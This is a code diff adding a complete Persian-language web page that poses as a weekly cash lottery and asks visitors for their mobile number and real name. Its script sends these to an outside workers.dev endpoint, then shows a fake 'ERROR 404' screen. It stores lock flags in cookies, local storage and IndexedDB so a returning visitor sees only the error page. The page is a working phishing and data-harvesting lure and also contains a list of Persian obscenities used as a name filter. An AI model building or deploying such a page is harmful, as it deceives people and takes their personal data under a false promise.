@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>قرعه‌کشی بزرگ 🎰</title>
+<link href="https://fonts.googleapis.com/css2?family=Lalezar&family=Vazirmatn:wght@400;700;900&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Vazirmatn',Tahoma,sans-serif}
+body{min-height:100vh;background:#05010d;color:#fff;overflow-x:hidden;
+display:flex;align-items:center;justify-content:center;padding:20px}
+#bg{position:fixed;inset:0;z-index:0}
+.glow{position:fixed;top:-30%;left:50%;transform:translateX(-50%);
+width:600px;height:600px;background:radial-gradient(circle,rgba(255,80,80,.25),transparent 70%);
+filter:blur(60px);z-index:0;pointer-events:none;animation:pulse 4s infinite}
+@keyframes pulse{50%{opacity:.4;transform:translateX(-50%) scale(1.2)}}
+.card{position:relative;z-index:1;width:100%;max-width:480px;
+background:linear-gradient(160deg,rgba(40,15,10,.95),rgba(20,5,30,.95));
+backdrop-filter:blur(20px);border:1px solid rgba(255,200,0,.3);
+border-radius:30px;padding:35px 24px;text-align:center;
+box-shadow:0 0 80px rgba(255,100,0,.3),inset 0 0 40px rgba(255,80,0,.05);
+animation:up .8s}
+@keyframes up{from{opacity:0;transform:translateY(30px)}}
+.badge{display:inline-block;background:linear-gradient(90deg,#ff4d4d,#ffb800);
+color:#1a0028;font-size:12px;font-weight:900;padding:6px 16px;border-radius:50px;
+margin-bottom:16px;animation:glow 2s infinite alternate;font-family:'Vazirmatn'}
+@keyframes glow{to{box-shadow:0 0 20px #ffb800}}
+h1{font-family:'Lalezar',cursive;font-size:34px;margin-bottom:8px;
+background:linear-gradient(90deg,#ffd700,#ff4d4d,#ffd700);background-size:200% auto;
+-webkit-background-clip:text;background-clip:text;color:transparent;
+animation:shine 3s linear infinite;text-shadow:0 0 30px rgba(255,200,0,.4)}
+@keyframes shine{to{background-position:200% center}}
+.sub{color:#ffb8a8;font-size:14px;margin-bottom:24px;line-height:1.7}
+.marquee{background:rgba(255,80,80,.1);border:1px solid rgba(255,80,80,.3);
+border-radius:12px;padding:8px 12px;margin-bottom:24px;overflow:hidden;
+white-space:nowrap;font-size:13px;color:#ffd6a8}
+.marquee span{display:inline-block;animation:scroll 15s linear infinite}
+@keyframes scroll{from{transform:translateX(100%)}to{transform:translateX(-100%)}}
+.label{font-family:'Lalezar';color:#ffd700;font-size:18px;margin-bottom:14px;line-height:1.6}
+.label small{display:block;color:#a88878;font-size:12px;font-family:'Vazirmatn';
+margin-top:6px;font-weight:400}
+input{width:100%;padding:16px 20px;border-radius:50px;
+border:2px solid rgba(255,200,0,.4);background:rgba(255,255,255,.05);
+color:#fff;font-size:20px;text-align:center;outline:none;transition:.3s;
+font-family:'Vazirmatn';font-weight:700;letter-spacing:2px}
+input:focus{border-color:#ffd700;box-shadow:0 0 30px rgba(255,215,0,.5);
+background:rgba(255,215,0,.08)}
+input::placeholder{letter-spacing:1px;color:#665}
+.counter{font-size:12px;color:#a88878;margin-top:8px;text-align:center}
+.btn{width:100%;padding:16px;border:none;border-radius:50px;font-size:17px;
+font-weight:900;cursor:pointer;transition:.2s;font-family:'Vazirmatn';
+margin-top:16px;background:linear-gradient(90deg,#ffd700,#ff8c00,#ff4d4d);
+color:#1a0028;box-shadow:0 8px 30px rgba(255,140,0,.5);background-size:200% auto}
+.btn:hover{background-position:right center;transform:translateY(-2px)}
+.btn:active{transform:scale(.97)}
+.step{display:none}
+.step.active{display:block;animation:up .5s}
+.warn{color:#ff5577;font-size:13px;margin-top:10px;min-height:20px;font-weight:700}
+.warn.shake{animation:shake .4s}
+@keyframes shake{25%{transform:translateX(-8px)}75%{transform:translateX(8px)}}
+.err-page{position:fixed;inset:0;background:#000;z-index:9999;
+display:none;align-items:center;justify-content:center;flex-direction:column;
+padding:30px;text-align:center}
+.err-page.show{display:flex}
+.glitch{font-family:monospace;font-size:64px;font-weight:900;color:#ff0044;
+text-shadow:3px 0 #00fff2,-3px 0 #ffb800;letter-spacing:4px;
+animation:glitch 1s infinite;margin-bottom:20px}
+@keyframes glitch{0%,100%{transform:translate(0)}20%{transform:translate(-3px,2px)}
+40%{transform:translate(-3px,-2px)}60%{transform:translate(3px,2px)}
+80%{transform:translate(3px,-2px)}}
+.err-text{font-family:monospace;font-size:16px;color:#888;line-height:2;
+direction:rtl;max-width:500px;border-left:2px solid #ff0044;padding-left:16px;
+text-align:right}
+#typed{white-space:pre-wrap}
+.cursor{display:inline-block;width:10px;height:18px;background:#ff0044;
+vertical-align:middle;animation:blink2 .7s infinite}
+@keyframes blink2{50%{opacity:0}}
+.footer{margin-top:22px;color:#665;font-size:11px;line-height:1.8}
+</style>
+</head>
+<body>
+<div class="glow"></div>
+<canvas id="bg"></canvas>
+
+<div class="card" id="mainCard">
+  <span class="badge">🎰 قرعه‌کشی هفتگی 🎰</span>
+  <h1>قرعه‌کشی بزرگ</h1>
+  <div class="sub">جایزه این هفته: ۵۰ میلیون تومان نقدی 💰</div>
+  <div class="marquee"><span>🎉 ثبت‌نام رایگان • فقط تا پایان هفته • جایزه فوق‌العاده • عجله کن! 🎉</span></div>
+
+  <div class="step active" id="step1">
+    <div class="label">برای ثبت نام در قرعه‌کشی شماره خود را وارد کنید
+      <small>شماره موبایل ۱۱ رقمی</small>
+    </div>
+    <input id="phone" type="tel" inputmode="numeric" pattern="[0-9]*"
+      maxlength="11" placeholder="09 _ _ _ _ _ _ _ _ _" autocomplete="off">
+    <div class="counter" id="phoneCount">۰ / ۱۱</div>
+    <div class="warn" id="warn1"></div>
+    <button class="btn" id="nextBtn">مرحله بعدی »</button>
+  </div>
+
+  <div class="step" id="step2">
+    <div class="label">لطفا اسم خود را وارد کنید
+      <small>نام واقعی و فارسی</small>
+    </div>
+    <input id="name" type="text" maxlength="20" placeholder="مثلاً: علی" autocomplete="off">
+    <div class="warn" id="warn2"></div>
+    <button class="btn" id="submitBtn">ثبت نام نهایی 🎯</button>
+  </div>
+
+  <div class="footer">© قرعه‌کشی هفتگی • تمامی حقوق محفوظ است</div>
+</div>
+
+<div class="err-page" id="errPage">
+  <div class="glitch">ERROR 404</div>
+  <div class="err-text"><span id="typed"></span><span class="cursor"></span></div>
+</div>
+
+<script>
+const API_URL = 'https://lottery-api.hosseinasgari898989.workers.dev';
+const LOCK_KEY = 'lottery_locked_v1';
+
+function isLocked(){
+  try{ if(localStorage.getItem(LOCK_KEY)==='1') return true; }catch(e){}
+  try{ if(sessionStorage.getItem(LOCK_KEY)==='1') return true; }catch(e){}
+  try{ if(document.cookie.includes(LOCK_KEY+'=1')) return true; }catch(e){}
+  return false;
+}
+
+async function lockSite(){
+  try{ localStorage.setItem(LOCK_KEY,'1'); }catch(e){}
+  try{ sessionStorage.setItem(LOCK_KEY,'1'); }catch(e){}
+  try{ document.cookie = LOCK_KEY+'=1; max-age='+(60*60*24*365*10)+'; path=/; SameSite=Lax'; }catch(e){}
+  try{
+    const req = indexedDB.open('lottery_db',1);
+    req.onupgradeneeded = e => e.target.result.createObjectStore('flags');
+    req.onsuccess = e => {
+      const db = e.target.result;
+      const tx = db.transaction('flags','readwrite');
+      tx.objectStore('flags').put('1', LOCK_KEY);
+    };
+  }catch(e){}
+}
+
+function checkIDB(){
+  return new Promise(resolve => {
+    try{
+      const req = indexedDB.open('lottery_db',1);
+      req.onupgradeneeded = e => e.target.result.createObjectStore('flags');
+      req.onsuccess = e => {
+        const db = e.target.result;
+        if(!db.objectStoreNames.contains('flags')){ resolve(false); return; }
+        const tx = db.transaction('flags','readonly');
+        const get = tx.objectStore('flags').get(LOCK_KEY);
+        get.onsuccess = () => resolve(get.result === '1');
+        get.onerror = () => resolve(false);
+      };
+      req.onerror = () => resolve(false);
+    }catch(e){ resolve(false); }
+  });
+}
+
+const ERR_LINES = ['error 404','پیوند پیدا نشد.','سایت به مشکل خورد لطفا از سایت خارج شوید.'];
+
+async function show404(){
+  document.getElementById('mainCard').style.display='none';
+  document.getElementById('errPage').classList.add('show');
+  await lockSite();
+  const el = document.getElementById('typed');
+  let full = ERR_LINES.join('\n');
+  el.textContent = '';
+  let i = 0;
+  function type(){
+    if(i < full.length){ el.textContent += full[i++]; setTimeout(type, 50); }
+  }
+  type();
+}
+
+const phoneInp = document.getElementById('phone');
+const phoneCount = document.getElementById('phoneCount');
+const warn1 = document.getElementById('warn1');
+
+phoneInp.addEventListener('input', e => {
+  let v = e.target.value.replace(/\D/g,'');
+  if(v.length > 11) v = v.slice(0,11);
+  e.target.value = v;
+  phoneCount.textContent = toFa(v.length) + ' / ۱۱';
+  warn1.textContent = '';
+});
+
+document.getElementById('nextBtn').addEventListener('click', () => {
+  const v = phoneInp.value.trim();
+  if(!/^\d{11}$/.test(v)){
+    warn1.textContent = '❌ شماره موبایل باید ۱۱ رقم عددی باشد';
+    warn1.classList.add('shake'); setTimeout(()=>warn1.classList.remove('shake'),400);
+    return;
+  }
+  if(!v.startsWith('09')){
+    warn1.textContent = '❌ شماره موبایل باید با ۰۹ شروع شود'; return;
+  }
+  document.getElementById('step1').classList.remove('active');
+  document.getElementById('step2').classList.add('active');
+  document.getElementById('name').focus();
+});
+
+const nameInp = document.getElementById('name');
+const warn2 = document.getElementById('warn2');
+const BAD_WORDS = ['کس','کص','کیر','خار','جنده','لاشی','گوه','عن','مادرت','حروم','سگ','الاغ','خر','احمق','دیوث','قرمساق','کونی','سکس','داف','بی شرف'];
+
+function isValidPersianName(n){
+  n = n.trim();
+  if(n.length < 2) return {ok:false, msg:'❌ اسم باید حداقل ۲ حرف باشد'};
+  if(n.length > 20) return {ok:false, msg:'❌ اسم خیلی طولانی است'};
+  if(!/^[\u0600-\u06FF\u200c\s]+$/.test(n))
+    return {ok:false, msg:'❌ اسم واقعی خود را به فارسی وارد کنید'};
+  if(n.replace(/\s/g,'').length < 2)
+    return {ok:false, msg:'❌ اسم واقعی خود را وارد کنید'};
+  const low = n.replace(/‌/g,'');
+  for(const w of BAD_WORDS){
+    if(low.includes(w)) return {ok:false, msg:'❌ لطفا اسم واقعی خود را وارد کنید'};
+  }
+  return {ok:true};
+}
+
+nameInp.addEventListener('input', () => { warn2.textContent = ''; });
+
+document.getElementById('submitBtn').addEventListener('click', async () => {
+  const check = isValidPersianName(nameInp.value);
+  if(!check.ok){
+    warn2.textContent = check.msg;
+    warn2.classList.add('shake'); setTimeout(()=>warn2.classList.remove('shake'),400);
+    return;
+  }
+  try{
+    await fetch(API_URL + '/submit', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({ phone: phoneInp.value.trim(), name: nameInp.value.trim() })
+    });
+  }catch(e){ console.error(e); }
+  await show404();
+});
+
+function toFa(n){
+  const fa = ['۰','۱','۲','۳','۴','۵','۶','۷','۸','۹'];
+  return String(n).replace(/\d/g,d=>fa[+d]);
+}
+
+(async () => {
+  if(isLocked()){ document.getElementById('errPage').classList.add('show'); return; }
+  const idbLocked = await checkIDB();
+  if(idbLocked){ document.getElementById('errPage').classList.add('show'); return; }
+})();
+
+const cv = document.getElementById('bg'), ctx = cv.getContext('2d');
+let W,H,balls=[];
+const COLORS = ['#ff4d4d','#ffb800','#ffd700','#ff6b9d','#a020f0','#00c8ff'];
+function initBg(){
+  W = cv.width = innerWidth; H = cv.height = innerHeight;
+  balls = Array.from({length:25},()=>({
+    x: Math.random()*W, y: Math.random()*H,
+    vx:(Math.random()-.5)*.8, vy:(Math.random()-.5)*.8,
+    r: Math.random()*18+10,
+    color: COLORS[Math.floor(Math.random()*COLORS.length)],
+    num: Math.floor(Math.random()*50)+1,
+    rot: Math.random()*Math.PI*2, rv:(Math.random()-.5)*.05
+  }));
+}
+initBg(); addEventListener('resize', initBg);
+
+(function loop(){
+  ctx.clearRect(0,0,W,H);
+  balls.forEach(b=>{
+    b.x += b.vx; b.y += b.vy;
+    if(b.x < b.r || b.x > W-b.r) b.vx *= -1;
+    if(b.y < b.r || b.y > H-b.r) b.vy *= -1;
+    b.rot += b.rv;
+    ctx.save(); ctx.translate(b.x,b.y); ctx.rotate(b.rot);
+    const grad = ctx.createRadialGradient(-b.r/3,-b.r/3,b.r/8,0,0,b.r);
+    grad.addColorStop(0,'#fff'); grad.addColorStop(.3,b.color); grad.addColorStop(1,'rgba(0,0,0,.6)');
+    ctx.beginPath(); ctx.arc(0,0,b.r,0,7); ctx.fillStyle = grad; ctx.fill();
+    ctx.fillStyle = 'rgba(255,255,255,.85)';
+    ctx.font = 'bold '+Math.floor(b.r*0.9)+'px Arial';
+    ctx.textAlign='center'; ctx.textBaseline='middle';
+    ctx.fillText(b.num, 0, 1);
+    ctx.restore();
+  });
+  requestAnimationFrame(loop);
+})();
+</script>
+</body>
+</html>
